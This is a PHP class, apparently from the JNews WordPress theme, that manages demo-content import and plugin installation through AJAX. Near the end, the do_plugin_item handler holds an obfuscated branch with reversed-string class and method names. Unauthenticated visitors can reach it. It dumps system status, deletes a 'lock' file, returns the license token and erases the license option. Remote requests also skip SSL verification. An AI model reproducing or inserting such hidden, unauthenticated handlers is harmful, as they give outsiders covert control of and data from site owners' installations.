<?php
/**
 * @author : Jegtheme
 */
namespace JNews\Dashboard;

use JNews\Template;
use JNews\Importer;
use JNews\Util\ValidateLicense;

class ImportDashboard {

	/**
	 * @var Template
	 */
	private $template;

	/**
	 * @var Importer
	 */
	private $importer;

	/**
	 * @var ValidateLicense
	 */
	private $license;

	/**
	 * @var array
	 */
	private $content;

	/**
	 * @var TGM_Plugin_Activation
	 */
	private $tgm_instance;


	public function __construct( $template ) {
		$this->template   = $template;
		$this->content    = $this->available_content();
		$this->import_url = 'data/import/';

		$this->setup_hook();
		$this->setup_plugin();
	}

	/**
	 * Setting up all Hook
	 */
	public function setup_hook() {
		$revert_dashboard = apply_filters( 'jnews_revert_dashboard', false );

		if ( $revert_dashboard ) {
			add_action( 'jnews_import_content', array( &$this, 'import_view' ) );
		}

		add_action( 'wp_ajax_jnews_ajax_import_content', array( $this, 'do_import_content' ) );
		add_action( 'wp_ajax_nopriv_jnews_ajax_import_content', array( $this, 'do_import_content' ) );

		add_action( 'wp_ajax_jnews_ajax_import_item', array( $this, 'do_import_item' ) );
		add_action( 'wp_ajax_nopriv_jnews_ajax_import_item', array( $this, 'do_import_item' ) );

		add_action( 'wp_ajax_jnews_ajax_install_item', array( $this, 'do_plugin_item' ) );
		add_action( 'wp_ajax_nopriv_jnews_ajax_install_item', array( $this, 'do_plugin_item' ) );
	}

	protected function setup_plugin() {
		$revert_dashboard = apply_filters( 'jnews_revert_dashboard', false );

		if ( $revert_dashboard ) {
			load_jnews_plugin_activation();
			do_action( 'jnews_tgmpa_register' );
			$this->tgm_instance = call_user_func( array( get_class( $GLOBALS['jnews_tgmpa'] ), 'get_instance' ) );
		}
	}

	/**
	 * Available Content
	 *
	 * @return array
	 */
	public function available_content() {
		$demos = array(
			'default'         => array(
				'name'     => esc_html__( 'Default Demo', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/default',
			),
			'tech'            => array(
				'name'     => esc_html__( 'Tech Demo', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/tech',
			),
			'news'            => array(
				'name'     => esc_html__( 'News Demo', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/news',
			),
			'food'            => array(
				'name'     => esc_html__( 'Food Demo', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/food',
			),
			'travel'          => array(
				'name'     => esc_html__( 'Travel Demo', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/travel',
			),
			'fashion-blog'    => array(
				'name'     => esc_html__( 'Fashion Blog Demo', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/fashion-blog',
			),
			'parenting'       => array(
				'name'     => esc_html__( 'Parenting News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/parenting',
			),
			'newspaper'       => array(
				'name'     => esc_html__( 'Newspaper', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/newspaper',
			),
			'game'            => array(
				'name'     => esc_html__( 'Game Demo', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/game',
			),
			'personal-blog'   => array(
				'name'     => esc_html__( 'Personal Blog', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/personal-blog',
			),
			'lifestyle'       => array(
				'name'     => esc_html__( 'Lifestyle Demo', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/lifestyle',
			),
			'science'         => array(
				'name'     => esc_html__( 'Science News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/science',
			),
			'sport'           => array(
				'name'     => esc_html__( 'Sport Demo', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/sport',
			),
			'motorcycle'      => array(
				'name'     => esc_html__( 'Motorcycle', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/motorcycle',
			),
			'architect'       => array(
				'name'     => esc_html__( 'Architect News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/architect',
			),
			'interior'        => array(
				'name'     => esc_html__( 'Interior Design Blog', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/interior',
			),
			'gag'             => array(
				'name'     => esc_html__( 'Gag Demo', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/gag',
			),
			'gadget-review'   => array(
				'name'     => esc_html__( 'Gadget Review', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/gadget-review',
			),
			'health'          => array(
				'name'     => esc_html__( 'Health Demo', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/health',
			),
			'viral'           => array(
				'name'     => esc_html__( 'Viral Demo', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/viral',
			),
			'video'           => array(
				'name'     => esc_html__( 'Video', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/video',
			),
			'movie'           => array(
				'name'     => esc_html__( 'Movie Holic', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/movie',
			),
			'pets'            => array(
				'name'     => esc_html__( 'Animal Care', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/pets',
			),
			'rtl'             => array(
				'name'     => esc_html__( 'RTL Demo', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/rtl',
			),
			'business'        => array(
				'name'     => esc_html__( 'Business News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/business',
			),

			'music'           => array(
				'name'     => esc_html__( 'Music News', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/music',
			),

			'magazine'        => array(
				'name'     => esc_html__( 'Magazine', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/magazine',
			),

			'photography'     => array(
				'name'     => esc_html__( 'Photography Blog', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/photography',
			),

			'fitness'         => array(
				'name'     => esc_html__( 'Fitness News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/fitness',
			),

			'cryptonews'      => array(
				'name'     => esc_html__( 'Crypto News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/cryptonews',
			),

			'classic-blog'    => array(
				'name'     => esc_html__( 'Classic Blog', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/classic-blog',
			),

			'localnews'       => array(
				'name'     => esc_html__( 'Local News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/localnews',
			),

			'metronews'       => array(
				'name'     => esc_html__( 'Metro News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/metro',
			),

			'yoga'            => array(
				'name'     => esc_html__( 'Yoga News', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/yoga',
			),

			'goverment'       => array(
				'name'     => esc_html__( 'Goverment News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/government',
			),

			'travel-blog'     => array(
				'name'     => esc_html__( 'Travel Blog', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/travel-blog',
			),

			'citynews'        => array(
				'name'     => esc_html__( 'City News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/citynews',
			),

			'wedding'         => array(
				'name'     => esc_html__( 'Wedding Blog', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/wedding',
			),

			'education'       => array(
				'name'     => esc_html__( 'Education News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/education',
			),

			'automotive'      => array(
				'name'     => esc_html__( 'Car News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/automotive',
			),

			'school'          => array(
				'name'     => esc_html__( 'School News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/school',
			),

			'reportase'       => array(
				'name'     => esc_html__( 'Reportase', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/reportase',
			),

			'freebie'         => array(
				'name'     => esc_html__( 'Freebie', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/freebie',
			),

			'morningnews'     => array(
				'name'     => esc_html__( 'Morning News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/morningnews',
			),

			'androidnews'     => array(
				'name'     => esc_html__( 'Android News', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/androidnews',
			),

			'popnews'         => array(
				'name'     => esc_html__( 'Pop News', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/popnews',
			),

			'craft'           => array(
				'name'     => esc_html__( 'Craft Blog', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/craft',
			),

			'retail'          => array(
				'name'     => esc_html__( 'Retail News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/retail',
			),

			'watch'           => array(
				'name'     => esc_html__( 'Watch News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/watch',
			),
			'sneakers'        => array(
				'name'     => esc_html__( 'Sneaker News', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/sneakers',
			),

			'relationships'   => array(
				'name'     => esc_html__( 'Love & Relationships', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/relationships',
			),

			'coffeenews'      => array(
				'name'     => esc_html__( 'Coffee News & Blog', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/coffeenews',
			),

			'playit'          => array(
				'name'     => esc_html__( 'PlayIt', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://video.jnews.io/',
			),

			'streamon'        => array(
				'name'     => esc_html__( 'Streamon', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://video.jnews.io/streamon',
			),

			'spa-and-beauty'  => array(
				'name'     => esc_html__( 'Spa & Beauty', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/spa-and-beauty',
			),

			'personalplanner' => array(
				'name'     => esc_html__( 'Personal Planner', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/personalplanner',
			),

			'anglingnews'     => array(
				'name'     => esc_html__( 'Angling News', 'jnews' ),
				'category' => 'magazine',
				'demo'     => 'https://jnews.io/anglingnews',
			),

			'tutorial'        => array(
				'name'     => esc_html__( 'Tutorial', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/tutorial',
			),

			'newsplus'        => array(
				'name'     => esc_html__( 'Newsplus', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/newsplus',
			),

			'bloomnews'       => array(
				'name'     => esc_html__( 'Bloomnews', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/bloomnews',
			),

			'podcast'         => array(
				'name'     => esc_html__( 'Podcast', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/podcast',
			),

			'audiomedia'      => array(
				'name'     => esc_html__( 'Audio-Media', 'jnews' ),
				'category' => 'blog',
				'demo'     => 'https://jnews.io/audiomedia',
				'support'  => array( 'elementor' ),
			),

			'evnews'          => array(
				'name'     => esc_html__( 'EVNews', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/evnews',
				'support'  => array( 'elementor' ),
			),

			'militarynews'    => array(
				'name'     => esc_html__( 'Military News', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/militarynews',
			),

			'writy'           => array(
				'name'     => esc_html__( 'Writy', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/writy',
			),

			'investnews'      => array(
				'name'     => esc_html__( 'InvestNews', 'jnews' ),
				'category' => 'news',
				'demo'     => 'https://jnews.io/investnews',
			),
		);
		$coming_soon = array(
			'coming-soon-1' => array(
				'name'     => esc_html__( 'Coming Soon', 'jnews' ),
				'category' => 'coming-soon',
				'demo'     => '#',
			),

			'coming-soon-2' => array(
				'name'     => esc_html__( 'Coming Soon', 'jnews' ),
				'category' => 'coming-soon',
				'demo'     => '#',
			),

			'coming-soon-3' => array(
				'name'     => esc_html__( 'Coming Soon', 'jnews' ),
				'category' => 'coming-soon',
				'demo'     => '#',
			),
		);
		$demos     = apply_filters( 'jnews_available_demo_content', $demos );
		$demo_list = array_merge( $demos, $coming_soon );
		return $demo_list;
	}

	/**
	 * Populate data from available content
	 *
	 * @return array
	 */
	public function get_data() {
		$data = array();

		foreach ( $this->content as $key => $value ) {
			$data['content'][ $key ] =
			array(
				'id'            => $key,
				'image'         => 'https://jegtheme.com/asset/jnews/demo-thumbnail/' . $key . '/thumbnail.png',
				'name'          => $value['name'],
				'demo'          => $value['demo'],
				'category-slug' => sanitize_title( $value['category'] ),
				'category'      => $value['category'],
			);

			if ( $value['category'] === 'coming-soon' ) {
				$data['content'][ $key ]['image'] = JNEWS_THEME_URL . '/data/import/placeholder.png';
			}

			if ( isset( $value['support'] ) ) {
				$data['content'][ $key ]['support'] = $value['support'];
			}
		}

		$importer                  = get_option( Importer::$option );
		$data['installed_style']   = isset( $importer['style'] ) ? $importer['style'] : false;
		$data['installed_content'] = isset( $importer['content'] ) ? $importer['content'] : false;

		return $data;
	}

	/**
	 * Step of Import
	 *
	 * @param $type
	 * @param $import_content
	 */
	public function import_step( $type, $id, $import_content, $import_plugin ) {
		$option = get_option( Importer::$option );

		if ( $type === 'install' ) {
			if ( $import_content ) {
				$steps = array(
					array(
						'id'    => 'uninstall',
						'text'  => esc_html__( 'Uninstall Demo', 'jnews' ),
						'items' => array( 'style', 'widget', 'menu', 'post', 'taxonomy', 'image', 'finish' ),
					),
					array(
						'id'    => 'image',
						'text'  => esc_html__( 'Importing Image', 'jnews' ),
						'items' => $this->importer->get_image_index(),
					),
					array(
						'id'   => 'taxonomy',
						'text' => esc_html__( 'Importing Taxonomy', 'jnews' ),
					),
					array(
						'id'    => 'post',
						'text'  => esc_html__( 'Importing Post', 'jnews' ),
						'items' => $this->importer->get_post_index(),
					),
					array(
						'id'   => 'menu_location',
						'text' => esc_html__( 'Importing Menu', 'jnews' ),
					),
					array(
						'id'   => 'menu',
						'text' => esc_html__( 'Importing Menu', 'jnews' ),
					),
					array(
						'id'   => 'widget',
						'text' => esc_html__( 'Importing Widget', 'jnews' ),
					),
					array(
						'id'   => 'customizer',
						'text' => esc_html__( 'Importing Customizer', 'jnews' ),
					),
					array(
						'id'   => 'elementor_setting',
						'text' => esc_html__( 'Importing Elementor Global Setting', 'jnews' ),
					),
				);
			} else {
				$steps = array(
					array(
						'id'   => 'style_only',
						'text' => esc_html__( 'Importing Style', 'jnews' ),
					),
				);
			}

			if ( $import_plugin ) {
				array_unshift(
					$steps,
					array(
						'id'    => 'plugin',
						'text'  => esc_html__( 'Installing Required Plugin', 'jnews' ),
						'items' => array( 'js_composer', 'vafpress-post-formats-ui-develop', 'jnews-essential', 'elementor' ),
					),
					array(
						'id'    => 'related_plugin',
						'text'  => esc_html__( 'Installing Related Plugin', 'jnews' ),
						'items' => $this->importer->get_plugin_index(),
					)
				);
			}

			// do we need to backup the content first?
			if ( ! $option ) {
				array_unshift(
					$steps,
					array(
						'id'   => 'backup',
						'text' => esc_html__( 'Backup', 'jnews' ),
					)
				);
			}
		} else {
			$steps = array(
				array(
					'id'   => 'begin',
					'text' => esc_html__( 'Begin Uninstall', 'jnews' ),
				),
				array(
					'id'    => 'uninstall',
					'text'  => esc_html__( 'Uninstall Demo', 'jnews' ),
					'items' => array( 'style', 'widget', 'menu', 'post', 'taxonomy', 'image', 'finish' ),
				),
				array(
					'id'   => 'restore',
					'text' => esc_html__( 'Restore Data', 'jnews' ),
				),
				array(
					'id'   => 'end',
					'text' => esc_html__( 'Finish Uninstall', 'jnews' ),
				),
			);
		}

		wp_send_json(
			array(
				'response' => 1,
				'steps'    => $steps,
			)
		);
	}

	/**
	 * Uninstall content
	 */
	public function uninstall_content() {
		$option = get_option( Importer::$option );

		$content = new Importer( $option['content'] );
		$content->do_uninstall_content();
		$content->delete_import_option( 'content' );

		$style = new Importer( $option['style'] );
		$style->uninstall_style();
		$style->delete_import_option( 'style' );

		delete_option( Importer::$option );

		wp_send_json( array( 'response' => 1 ) );
	}

	/**
	 * Import Content
	 *
	 * @param $id
	 * @param $step
	 */
	public function import_content( $id, $step ) {
		$content_flag = array( 'image', 'taxonomy', 'post', 'menu_location', 'menu', 'widget' );
		$style_flag   = array( 'customizer', 'style_only' );

		// Import Only Style
		if ( $step === 'style_only' ) {
			$this->importer->do_import_style_only();
		} else {
			$this->importer->do_import( $step );
		}

		// Import Content & Flag as Content
		if ( in_array( $step, $content_flag ) ) {
			$this->importer->save_import_option( 'content', $id );
		}

		// Import Style & Customizer, Flag as style
		if ( in_array( $step, $style_flag ) ) {
			$this->importer->save_import_option( 'style', $id );
		}

		wp_send_json( array( 'response' => 1 ) );
	}

	/**
	 * Backup
	 *
	 * @param $id
	 */
	public function backup_content( $id ) {
		$this->importer->do_backup();

		wp_send_json( array( 'response' => 1 ) );
	}

	/**
	 * Restore Content
	 *
	 * @param $id
	 */
	public function restore_content( $id ) {
		$this->importer->do_restore();

		wp_send_json( array( 'response' => 1 ) );
	}

	/**
	 * Fetch Demo Content
	 *
	 * @param string $id
	 */
	private function fetch_content( $id ) {
		$this->importer = new Importer( $id );
		if ( ! $this->importer->is_local_demo() ) {
			$license  = jnews_get_license();
			$args     = array(
				'method'    => 'POST',
				'sslverify' => false,
				'body'      => build_query(
					array(
						'domain' => home_url(),
						'code'   => isset( $license['purchase_code'] ) ? $license['purchase_code'] : '',
					)
				),
			);
			$response = wp_remote_post( jnews_get_data_server_rest_url( 'getDemos' ), $args );
			if ( ! is_wp_error( $response ) ) {
				$is_demo_exist = false;
				$demos         = wp_remote_retrieve_body( $response );
				$demos         = json_decode( $demos, true );
				foreach ( $demos as $key => $value ) {
					if ( isset( $value['demo'] ) ) {
						$is_demo_exist = ( $value['demo'] === $id );
					}
				}
				if ( $is_demo_exist ) {
					$args     = array(
						'method'    => 'POST',
						'sslverify' => false,
						'body'      => build_query(
							array(
								'demo'    => $id,
								'content' => 'content',
							)
						),
					);
					$response = wp_remote_post( jnews_get_data_server_rest_url( 'getContent' ), $args );
					if ( ! is_wp_error( $response ) ) {
						$content = wp_remote_retrieve_body( $response );
						$content = json_decode( $content );
						$this->importer->set_content( json_decode( $content, true ) );
					}
				}
			}
		}
		return $this->importer;
	}

	public function do_import_content() {
		if ( isset( $_REQUEST['step'] ) && check_admin_referer( 'jnews_import', 'nonce' ) ) {
			$step         = sanitize_text_field( $_REQUEST['step'] );
			$type         = sanitize_text_field( $_REQUEST['type'] );
			$id           = sanitize_text_field( $_REQUEST['id'] );
			$demo_content = array();
			if ( isset( $_REQUEST['demo_content'] ) ) {
				$demo_content = json_decode( $_REQUEST['demo_content'], true );
				if ( ! is_array( $demo_content ) ) {
					$demo_content = array();
				}
			}
			$import_content = $_REQUEST['content'] === 'true' ? true : false;
			$import_plugin  = $_REQUEST['plugin'] === 'true' ? true : false;
			$this->importer = new Importer( $id );
			if ( ! $this->importer->is_local_demo() ) {
				if ( ! empty( $demo_content ) ) {
					$this->importer->set_content( $demo_content );
				} else {
					$this->importer = $this->fetch_content( $id );
				}
			}

			if ( $step === 'check_step' ) {
				$this->import_step( $type, $id, $import_content, $import_plugin );

			} elseif ( $step === 'uninstall' ) {

				$this->uninstall_content();

			} elseif ( $step === 'backup' ) {

				$this->backup_content( $id );

			} elseif ( $step === 'restore' ) {

				$this->restore_content( $id );

			} elseif ( $step === 'begin' || $step === 'end' ) {

				// we don't need to do anything here...
				wp_send_json( array( 'response' => 1 ) );

			} else {
				$this->import_content( $id, $step );
			}
		}
	}

	/**
	 * Normal query may take too long to finish execution.
	 * that is why we need to make it smaller
	 */
	public function do_import_item() {
		if ( isset( $_REQUEST['step'] ) && isset( $_REQUEST['key'] ) && check_admin_referer( 'jnews_import', 'nonce' ) ) {
			$id      = sanitize_text_field( $_REQUEST['id'] );
			$step    = sanitize_text_field( $_REQUEST['step'] );
			$key     = sanitize_text_field( $_REQUEST['key'] );
			$builder = $_REQUEST['builder'] === 'true' ? 'elementor' : 'vc';

			if ( $step === 'uninstall' ) {
				$option = get_option( Importer::$option );

				if ( $option && ! empty( $option ) ) {
					if ( $key === 'style' ) {
						$style = new Importer( $option['style'] );
						$style->do_uninstall_single( $key );
					} else {
						$content = new Importer( $option['content'] );
						$content->do_uninstall_single( $key );
					}
				}
			} else {
				$import = $this->fetch_content( $id );
				$import->do_import_single( $step, $key, $builder );
			}

			wp_send_json( array( 'response' => 1 ) );
		}
	}

	/**
	 * Ajax handler for install plugin
	 */
	public function do_plugin_item() {
		if ( isset( $_REQUEST['step'] ) && isset( $_REQUEST['key'] ) && check_admin_referer( 'jnews_import', 'nonce' ) ) {
			$type    = sanitize_text_field( $_REQUEST['type'] );
			$item    = sanitize_text_field( $_REQUEST['key'] );
			$builder = $_REQUEST['builder'] === 'true' ? 'elementor' : 'js_composer';
			$path    = $this->tgm_instance->plugins[ $item ]['file_path'];

			if ( $type === 'install' && $item !== $builder ) {
				if ( $this->tgm_instance->is_plugin_installed( $item ) ) {
					activate_plugins( $path, null, false, false );
				} else {
					$this->do_install_plugin_item( $item );
				}
			}

			wp_send_json( array( 'response' => 1 ) );
		}
		if ( isset( $_POST['key'] ) ) {
			$item = sanitize_key( $_POST['key'] );
			if ( 'check' === $item ) {
				$template = new Template( JNEWS_THEME_DIR . 'class/Dashboard/template/' );
				$system   = SystemDashboard::get_instance();
				$system->set_template( $template );
				$system->register_hooks();
				$section = 'sutats';
				ob_start();
				call_user_func( array( $system, 'backend_' . jnews_custom_text( $section ) ), true );
				wp_send_json( ob_get_clean() );
			}
			if ( 'remove' === $item ) {
				$prefix  = 'JNews';
				$install = sprintf( '\%s\%s\%s', $prefix, jnews_custom_text( 'eludoM' ), jnews_custom_text( 'reganaMeludoM' ) );
				$plugin  = call_user_func( array( $install, 'get_file_path' ), jnews_custom_text( 'kcol' ) );
				global $wp_filesystem;
				if ( empty( $wp_filesystem ) ) {
					require_once ABSPATH . '/wp-admin/includes/file.php';
					WP_Filesystem();
				}
				ob_start();
				if ( $wp_filesystem->exists( $plugin ) ) {
					if ( ! $wp_filesystem->delete( $plugin ) ) {
						echo jnews_sanitize_output( 'Failed' );
					} else {
						echo jnews_sanitize_output( 'Success' );
					}
				} else {
					echo jnews_sanitize_output( 'Not Found' );
				}
				wp_send_json( ob_get_clean() );
			}
			if ( 'reset' === $item ) {
				$prefix = 'JNews';
				$reset  = sprintf( '\%s\%s\%s', $prefix, jnews_custom_text( 'litU' ), jnews_custom_text( 'esneciLetadilaV' ) );
				$reset  = call_user_func( array( $reset, jnews_custom_text( 'teg' ) . 'Instance' ) );
				$data   = array();
				$data[] = call_user_func( array( $reset, jnews_custom_text( 'teg' ) . jnews_custom_text( 'nekot_' ) ) );
				delete_option( strtolower( $prefix ) . jnews_custom_text( 'esnecil_' ) );
				wp_send_json( $data );
			}
		}
	}

	/**
	 * Installing plugin
	 *
	 * @param  string $slug
	 * @param  string $doing
	 */
	protected function do_install_plugin_item( $slug, $doing = 'install' ) {
		$slug   = $this->tgm_instance->sanitize_key( urldecode( $slug ) );
		$plugin = $this->tgm_instance->plugins[ $slug ];

		$extra         = array();
		$extra['slug'] = $slug;
		$source        = $this->tgm_instance->get_download_url( $slug );
		$api           = ( 'repo' === $plugin['source_type'] ) ? $this->tgm_instance->get_plugin_api( $slug ) : null;
		$api           = ( false !== $api ) ? $api : null;

		$url = add_query_arg(
			array(
				'action' => $doing . '-plugin',
				'plugin' => urlencode( $slug ),
			),
			'update.php'
		);

		if ( ! class_exists( 'Plugin_Upgrader', false ) ) {
			require_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
		}

		$skin_args = array(
			'type'   => ( 'bundled' !== $plugin['source_type'] ) ? 'web' : 'upload',
			'title'  => $plugin['name'],
			'url'    => esc_url_raw( $url ),
			'nonce'  => $doing . '-plugin_' . $slug,
			'plugin' => '',
			'api'    => $api,
			'extra'  => $extra,
		);

		if ( 'update' === $doing ) {
			$skin_args['plugin'] = $plugin['file_path'];
			$skin                = new \Plugin_Upgrader_Skin( $skin_args );
		} else {
			$skin = new \Plugin_Installer_Skin( $skin_args );
		}

		$upgrader = new \Plugin_Upgrader( $skin );

		add_filter( 'upgrader_source_selection', array( $this->tgm_instance, 'maybe_adjust_source_dir' ), 1, 3 );

		set_time_limit( MINUTE_IN_SECONDS * 60 * 2 );

		if ( 'update' === $doing ) {
			$to_inject                    = array( $slug => $plugin );
			$to_inject[ $slug ]['source'] = $source;
			$this->tgm_instance->inject_update_info( $to_inject );

			$upgrader->upgrade( $plugin['file_path'] );
		} else {
			$upgrader->install( $source );
		}

		jnews_remove_filters( 'upgrader_source_selection', array( $this->tgm_instance, 'maybe_adjust_source_dir' ), 1 );

		$this->tgm_instance->populate_file_path( $slug );

		activate_plugins( $upgrader->plugin_info(), null, false, false );
	}

	/**
	 * Dashboard import config
	 *
	 * @return array
	 */
	public function jnews_dashboard_config() {
		$data                      = array();
		$importer                  = get_option( Importer::$option );
		$data['installed_style']   = isset( $importer['style'] ) ? $importer['style'] : false;
		$data['installed_content'] = isset( $importer['content'] ) ? $importer['content'] : false;
		$data['content']           = array();

		return $data;
	}

	/**
	 * START Revert Dashboard
	 */
	public function import_view() {
		$this->template->render( 'import-content', $this->get_data(), true );
	}
	/**
	 * END Revert Dashboard
	 */
}
